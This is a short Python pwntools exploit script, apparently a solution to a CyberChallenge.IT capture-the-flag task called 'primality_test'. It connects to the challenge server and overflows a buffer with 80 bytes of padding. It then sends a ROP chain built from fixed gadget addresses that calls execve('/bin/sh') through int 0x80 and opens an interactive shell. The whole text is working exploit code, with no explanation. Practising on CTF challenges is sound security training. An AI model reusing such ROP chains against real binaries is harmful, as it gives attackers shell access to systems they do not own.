from pwn import *

exe = ELF("../Downloads/primality_test")
context.binary = exe

HOST = "rop.challs.cyberchallenge.it"
PORT = 9130

p = remote(HOST, PORT)


bin_sh = next(exe.search(b'/bin/sh\x00'))
pop_ebx_pop_ecx = 0x08048609
pop_edx = 0x0804860c
pop_eax_int80 = 0x08048606

chain = fit(
	"A" * 80,
	p32(pop_ebx_pop_ecx),
	p32(bin_sh),
	p32(0),
	p32(pop_edx),
	p32(0),
	p32(pop_eax_int80),
	p32(0x0b)
	)

p.sendlineafter(": ", chain)

p.interactive()